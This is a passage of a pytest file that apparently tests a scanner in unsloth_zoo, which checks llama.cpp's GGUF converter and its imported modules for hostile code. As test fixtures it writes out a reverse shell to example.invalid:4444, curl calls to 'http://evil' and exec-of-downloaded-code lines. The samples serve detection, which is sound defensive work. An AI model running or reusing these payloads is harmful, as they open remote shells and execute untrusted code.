    assert seen["content"] == _MINIMAL_CONVERTER, "scan saw patched or truncated bytes"
    assert seen["patched_exists"] is False, "patched script existed before the scan ran"
    # A converter in the llama.cpp directory with no prebuilt marker and no
    # UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin is not user-chosen, so no strict-mode exemption.
    assert seen["is_local_copy"] is False
    assert seen["source"].endswith("convert_hf_to_gguf.py")
    assert os.path.isfile(patched)


def test_export_survives_a_scanner_that_raises(llama_cpp, tmp_path, monkeypatch):
    """A bug in the scan cannot take down a legitimate conversion."""
    scan_module = _load("converter_scan_for_export", "unsloth_zoo/converter_scan.py")

    def _boom(*args, **kwargs):
        raise RuntimeError("scanner bug")

    monkeypatch.setattr(scan_module, "scan_converter_source", _boom)
    monkeypatch.setattr(
        llama_cpp, "warn_on_suspicious_converter", scan_module.warn_on_suspicious_converter,
    )
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert os.path.isfile(patched)


def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, monkeypatch, caplog):
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(
            llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" not in caplog.text


def test_export_strict_mode_refuses_a_downloaded_converter_and_writes_nothing(
    llama_cpp, tmp_path, monkeypatch,
):
    """Covers the `except ConverterScanError: raise` clause: the refusal keeps its own message, not
    an introspection failure, and no patched script reaches disk."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with pytest.raises(llama_cpp.ConverterScanError) as excinfo:
        llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    message = str(excinfo.value)
    assert "Refusing to run" in message
    assert "loading/introspection" not in message
    assert not (scripts_dir / "unsloth_convert_hf_to_gguf.py").exists()


def test_export_of_a_downloaded_converter_is_not_refused_without_strict_mode(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    """Same flagged download, strict mode unset: warn and carry on."""
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with caplog.at_level("WARNING"):
        patched, _text, _vision = llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" in caplog.text
    assert CONVERTER_URL in caplog.text


def test_export_warns_but_completes_on_a_flagged_local_converter(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(llama_cpp, tmp_path, monkeypatch, payload)
    assert "suspicious pattern" in caplog.text
    assert "Reverse shell" in caplog.text
    assert os.path.isfile(patched), "a warning must not block the export"


def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
    """The strict-mode exemption means the user chose the file; the unpinned upstream checkout
    install_llama_cpp falls back to is not a local copy, so strict mode refuses it."""
    llama_cpp = _load("llama_cpp_trust_probe", "unsloth_zoo/llama_cpp.py")

    clone = tmp_path / "clone"
    clone.mkdir()
    script = clone / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "a bare checkout must not be exempt"
    )

    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(clone))
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an explicit pin is a deliberate user choice"
    )

    assert llama_cpp._converter_is_trusted_local(None) is False


def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
    """os.listdir saw only immediate children, so a nested package imported by a clean
    conversion/__init__.py ran unscanned and uncounted against the cap."""
    llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text(
        "from .nested import payload\n", encoding = "utf-8",
    )
    (nested / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )

    assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
        str(root / "conversion")
    )[0]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
    """The cache key must cover what the scan reads, or a changed nested module goes unseen."""
    llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (root / "conversion" / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    deep = nested / "helper.py"
    deep.write_text("Z = 1\n", encoding = "utf-8")

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None
    deep.write_text("Z = 2  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
    tmp_path, monkeypatch, caplog
):
    """Scanning only the first MAX names let a late-sorting payload hide; the cap stays fixed, since
    attackers must not size the work, so crossing it is the finding."""
    llama_cpp = _load("llama_cpp_cap_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("more than the" in record.message for record in caplog.records), (
        f"the oversized package was not reported: {[r.message for r in caplog.records]}"
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "more than the"):
        llama_cpp._scan_conversion_package(str(root))

    # The same switch that silences every other finding silences this one.
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    llama_cpp._scan_conversion_package(str(root))


def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatch):
    """os.walk does not follow directory symlinks but the import machinery does, so a symlinked
    conversion.linked package was never walked and ran unscanned."""
    llama_cpp = _load("llama_cpp_symlink_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text(
        "from .linked import payload\n", encoding = "utf-8",
    )
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )
    try:
        (conversion / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))[0]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_symlink_loop_in_the_package_terminates(tmp_path):
    """Following directory symlinks lets a cycle like conversion/loop repeat forever, so the walk
    must notice a directory it already saw."""
    llama_cpp = _load("llama_cpp_symlink_loop_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    try:
        (conversion / "loop").symlink_to(conversion, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    walk = llama_cpp._conversion_package_modules(str(conversion))
    names, complete = walk.names, walk.complete

    # The claim is termination: the module is found once, and the loop adds at most one pass.
    assert "__init__.py" in names
    assert len(names) <= 2


def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatch):
    """The cap must bound the walk, not just the reads: materializing an attacker-supplied tree
    costs unbounded time and memory, and _conversion_sibling_info re-walks it per export."""
    llama_cpp = _load("llama_cpp_walk_bound_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    # Each directory holds one file, so stopping early must mean visiting fewer directories, not
    # returning fewer names from a fully read tree.
    total = llama_cpp.MAX_CONVERSION_PACKAGE_FILES * 4
    for index in range(total):
        package = conversion / f"pkg_{index:04d}"
        package.mkdir()
        (package / "__init__.py").write_text("VALUE = 1\n", encoding = "utf-8")

    visited = []
    real_walk = os.walk

    def counting_walk(top, *args, **kwargs):
        for entry in real_walk(top, *args, **kwargs):
            visited.append(entry[0])
            yield entry

    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
    limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
    walk = llama_cpp._conversion_package_modules(
        str(conversion), file_limit = limit,
    )
    names, complete = walk.names, walk.complete

    assert len(names) == limit
    assert len(visited) <= limit + 1, (
        f"walked {len(visited)} directories of {total} to learn the cap was crossed"
    )

    # Unbounded by default: with no bound the caller gets the whole tree, not a truncated one.
    visited.clear()
    assert len(llama_cpp._conversion_package_modules(str(conversion))[0]) == total


def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
    tmp_path, monkeypatch, caplog
):
    """Counting .py files bounds what gets READ, not WALKED: non-Python entries never reach the file
    cap, and _conversion_sibling_info re-walks the tree before every cached export."""
    llama_cpp = _load("llama_cpp_entry_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (conversion / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    # Well past the entry budget, and holding no Python at all.
    entries = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 2
    for index in range(entries):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    visited = []
    real_walk = os.walk

    def counting_walk(top, *args, **kwargs):
        for entry in real_walk(top, *args, **kwargs):
            visited.append(entry[0])
            yield entry

    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
    walk = llama_cpp._conversion_package_modules(
        str(conversion),
        file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
        entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES,
    )
    names, complete = walk.names, walk.complete
    assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES
    assert complete is False, "an oversized tree must not report itself fully walked"

    # Only the entry budget can report this, and unread entries must not pass as clean.
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("directory entries" in record.message for record in caplog.records), (
        f"the unwalkable package was not reported: {[r.message for r in caplog.records]}"
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "directory entries"):
        llama_cpp._scan_conversion_package(str(root))


def test_the_cache_key_moves_when_the_bytes_do_under_a_preserved_mtime(tmp_path):
    """(path, mtime, size) is not a file identity: same-size bytes with a restored mtime kept the
    key, so unread bytes were imported; a metadata-preserving copy suffices."""
    llama_cpp = _load("llama_cpp_key_identity_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    module = conversion / "base.py"
    module.write_text("VALUE = 1\n", encoding = "utf-8")
    stamp = os.stat(module)

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None

    # Same length, same mtime, different bytes.
    module.write_text("VALUE = 9\n", encoding = "utf-8")
    os.utime(module, ns = (stamp.st_atime_ns, stamp.st_mtime_ns))
    assert os.stat(module).st_mtime_ns == stamp.st_mtime_ns
    assert os.stat(module).st_size == stamp.st_size

    assert llama_cpp._conversion_sibling_info(str(root)) != before


def _pyc(flags: int) -> bytes:
    return b"\x00" * 4 + flags.to_bytes(4, "little") + b"\x00" * 56


def test_unsloths_own_routing_pin_does_not_buy_the_strict_exemption(tmp_path, monkeypatch):
    """Unsloth's own UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin, set by MLX routing, must not buy the strict
    exemption, which had turned the whole control off for save_pretrained_gguf."""
    llama_cpp = _load("llama_cpp_routing_pin_probe", "unsloth_zoo/llama_cpp.py")

    installed = tmp_path / "llama.cpp"
    installed.mkdir()
    script = installed / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)

    with llama_cpp.internal_scripts_dir_pin(str(installed)):
        # Set, so the patcher still resolves against the install...
        assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(installed)
        # ...and still not the user's choice about these bytes.
        assert llama_cpp._converter_is_trusted_local(str(script)) is False

    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" not in os.environ


def test_a_real_user_pin_still_earns_the_exemption(tmp_path, monkeypatch):
    """A user-set pin keeps meaning 'I chose this file', even when MLX routing repoints it."""
    llama_cpp = _load("llama_cpp_user_pin_probe", "unsloth_zoo/llama_cpp.py")

    chosen = tmp_path / "my-llama.cpp"
    chosen.mkdir()
    script = chosen / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(chosen))

    assert llama_cpp._converter_is_trusted_local(str(script)) is True

    elsewhere = tmp_path / "auto-installed"
    elsewhere.mkdir()
    with llama_cpp.internal_scripts_dir_pin(str(elsewhere)):
        # An existing pin is the user's and is left exactly as it is.
        assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(chosen)
        assert llama_cpp._converter_is_trusted_local(str(script)) is True

    assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(chosen)
    assert llama_cpp._converter_is_trusted_local(str(script)) is True


def test_the_converter_cache_key_carries_whether_the_pin_was_the_users(tmp_path, monkeypatch):
    """The cache key must carry whether the pin was the user's, or a result trusted under a user pin
    is served again once the variable is cleared and MLX routes to the same folder."""
    llama_cpp = _load("llama_cpp_trust_key_probe", "unsloth_zoo/llama_cpp.py")

    folder = tmp_path / "llama.cpp"
    folder.mkdir()
    script = folder / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    seen = []

    def record(
        name, local_info, conversion_info, scan_mode = None, trusted = False, stuck = (),
    ):
        seen.append(trusted)
        return "patched"

    monkeypatch.setattr(
        llama_cpp, "_download_convert_hf_to_gguf_cached", record,
    )
    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)

    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(folder))
    llama_cpp._download_convert_hf_to_gguf()

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    with llama_cpp.internal_scripts_dir_pin(str(folder)):
        llama_cpp._download_convert_hf_to_gguf()

    # Only provenance differs; not keying it lets lru_cache serve the trusted answer to both.
    assert seen == [True, False], seen


def test_bytecode_appearing_after_a_cached_export_is_still_purged(tmp_path, monkeypatch):
    """The bytecode purge runs before the cache lookup, since a .pyc dropped beside an unchanged
    source leaves the key identical."""
    llama_cpp = _load("llama_cpp_purge_before_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    script = root / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)
    monkeypatch.setattr(
        llama_cpp, "_download_convert_hf_to_gguf_cached", lambda *a, **k: "patched",
    )

    llama_cpp._download_convert_hf_to_gguf()          # the first, clean export

    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    planted = cache / "base.cpython-313.pyc"
    planted.write_bytes(_pyc(0))

    llama_cpp._download_convert_hf_to_gguf()          # served from cache, and yet
    assert not planted.exists(), "bytecode planted after a cached export survived"


def test_bytecode_that_cannot_be_purged_reaches_the_cache_key(tmp_path, monkeypatch):
    """Deleting is the defence; if it fails, the key must differ so the scan runs and reports."""
    llama_cpp = _load("llama_cpp_stuck_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    script = root / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    seen = []

    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)
    monkeypatch.setattr(
        llama_cpp,
        "_download_convert_hf_to_gguf_cached",
        lambda *args, **kwargs: seen.append(args[-1]) or "patched",
    )

    llama_cpp._download_convert_hf_to_gguf()

    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    (cache / "base.cpython-313.pyc").write_bytes(_pyc(0))
    real_remove = os.remove

    def refuse(path, *args, **kwargs):
        if str(path).endswith(".pyc"):
            raise PermissionError(13, "read-only file system", str(path))
        return real_remove(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "remove", refuse)
    llama_cpp._download_convert_hf_to_gguf()

    assert seen[0] == ()
    assert seen[1] == ("conversion/__pycache__/base.cpython-313.pyc",), seen[1]


def test_an_unreadable_directory_does_not_silence_the_whole_package(
    tmp_path, monkeypatch, caplog
):
    """One unreadable directory must not discard what was already collected: an untrusted package
    could hide a readable module behind it, and strict mode would run it silently."""
    llama_cpp = _load("llama_cpp_unreadable_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    (conversion / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    locked = conversion / "locked"
    locked.mkdir()

    real_scandir = os.scandir

    def refuse(path, *args, **kwargs):
        if str(path) == str(locked):
            raise PermissionError(13, "permission denied", str(path))
        return real_scandir(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)

    walk = llama_cpp._conversion_package_modules(str(conversion))
    assert "payload.py" in walk.names, "modules found before the failure were discarded"
    assert walk.unreadable == ("locked",), walk.unreadable
    assert walk.complete is False

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    messages = [record.message for record in caplog.records]
    # Both: the directory nothing could read, and the payload that was readable.
    assert any("could not read" in message for message in messages), messages
    assert any("example.invalid" in message or "remote" in message.lower()
               for message in messages), messages

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
    tmp_path, monkeypatch
):
    """The top directory collects nothing, so it must not read as an empty, clean package."""
    llama_cpp = _load("llama_cpp_unreadable_top_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    real_scandir = os.scandir

    def refuse(path, *args, **kwargs):
        if str(path) == str(conversion):
            raise PermissionError(13, "permission denied", str(path))
        return real_scandir(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)
    walk = llama_cpp._conversion_package_modules(str(conversion))
    assert walk.names is None and walk.unreadable == (".",)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "could not read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_root_module_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
    """The converter's directory is sys.path[0], ahead of the gguf-py entry at index 1, so a root
    gguf.py shadows gguf-py/gguf and must be scanned too."""
    llama_cpp = _load("llama_cpp_shadow_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text("WHO = 'real'\n", encoding = "utf-8")
    (root / "gguf.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
    """A root package with __init__.py runs on import and shadows too, unlike a namespace dir."""
    llama_cpp = _load("llama_cpp_shadow_pkg_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    shadow = root / "gguf"
    shadow.mkdir()
    (shadow / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_directory_nothing_imports_is_not_scanned(tmp_path, monkeypatch, caplog):
    """The scan follows imports, so unimported directories are not read; scanning them all refused
    clean upstream checkouts under UNSLOTH_CONVERTER_SCAN_STRICT."""
    llama_cpp = _load("llama_cpp_import_scope_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # Shaped like upstream's: a benchmark utility nothing imports.
    bench = root / "scripts"
    bench.mkdir()
    (bench / "server_bench.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # no refusal
    assert not [r for r in caplog.records if "suspicious" in r.message], (
        [r.message for r in caplog.records]
    )
    assert "scripts" not in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }

    # The same directory, once something the converter runs imports its name.
    _converter_imports(root, "scripts")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
    """Names come from the converter's own sources; reading the root wholesale re-admitted
    examples/, imported by a script Unsloth never runs."""
    llama_cpp = _load("llama_cpp_sibling_script_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "examples").mkdir()
    (root / "convert_llama_ggml_to_gguf.py").write_text(
        "import examples.convert_legacy_llama\n", encoding = "utf-8",
    )

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "examples" not in labels, sorted(labels)


def test_the_import_closure_is_followed_past_the_first_hop(tmp_path, monkeypatch):
    """A nested module's imports are part of what runs: reading only direct modules stopped the
    closure one hop in, so a root payload package imported by a nested module ran unread."""
    llama_cpp = _load("llama_cpp_closure_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    nested = root / "conversion" / "nested"
    nested.mkdir()
    (nested / "__init__.py").write_text("", encoding = "utf-8")
    (nested / "mod.py").write_text("import payload\n", encoding = "utf-8")
    init = root / "conversion" / "__init__.py"
    init.write_text(
        "from .nested import mod\n" + init.read_text(encoding = "utf-8"),
        encoding = "utf-8",
    )
    shadow = root / "payload"
    shadow.mkdir()
    (shadow / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    assert "payload" in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_checkout_with_no_readable_entrypoint_still_narrows(tmp_path):
    """The closure is seeded from the entrypoint and the packages it imports; seeding from the
    entrypoint alone yields nothing when it is missing or unparseable, so every directory gets
    scanned."""
    llama_cpp = _load("llama_cpp_no_entrypoint_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    assert not (root / "convert_hf_to_gguf.py").exists(), "the point of this layout"
    (root / "scripts").mkdir()
    (root / "scripts" / "bench.py").write_text("X = 1\n", encoding = "utf-8")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "scripts" not in labels, sorted(labels)


def test_import_discovery_spends_one_budget_across_the_whole_walk(tmp_path, monkeypatch):
    """A per-directory entry budget bounds nothing: a tree branching through empty directories never
    advances the .py counter, so one budget must span the whole walk."""
    llama_cpp = _load("llama_cpp_aggregate_budget_probe", "unsloth_zoo/llama_cpp.py")

    package = tmp_path / "pkg"
    package.mkdir()
    (package / "__init__.py").write_text("import gguf\n", encoding = "utf-8")
    # Branching, not deep: each directory is under its budget, yet the whole tree is over it.
    wide = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES // 32 + 2
    for outer in range(wide):
        for inner in range(32):
            (package / f"a{outer}" / f"b{inner}").mkdir(parents = True)

    handed_out = {"count": 0}
    real_scandir = os.scandir

    class _Counting:
        def __init__(self, inner):
            self.inner = inner

        def __enter__(self):
            self.inner.__enter__()
            return self

        def __exit__(self, *args):
            return self.inner.__exit__(*args)

        def __iter__(self):
            for entry in self.inner:
                handed_out["count"] += 1
                yield entry

    monkeypatch.setattr(
        llama_cpp.os, "scandir", lambda path: _Counting(real_scandir(path))
    )
    names = llama_cpp._imported_top_level_names(str(package), recursive = True)

    assert handed_out["count"] <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 32, (
        f"discovery walked {handed_out['count']} entries on one budget of "
        f"{llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES}"
    )
    # Stopping early must not be silent about what it did read.
    assert names == {"gguf"} or names is None, names


def test_the_import_closure_reads_each_package_once(tmp_path, monkeypatch):
    """conversion/ and gguf-py/gguf are seeded and admitted by name, so without a guard each is
    parsed twice per export; the cache key runs on every export."""
    llama_cpp = _load("llama_cpp_double_parse_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text("X = 1\n", encoding = "utf-8")

    seen = []
    real = llama_cpp._imported_top_level_names

    def _counting(directory, only = None, recursive = False):
        if recursive:
            seen.append(os.path.realpath(directory))
        return real(directory, only = only, recursive = recursive)

    monkeypatch.setattr(llama_cpp, "_imported_top_level_names", _counting)
    llama_cpp._scanned_locations(str(root))
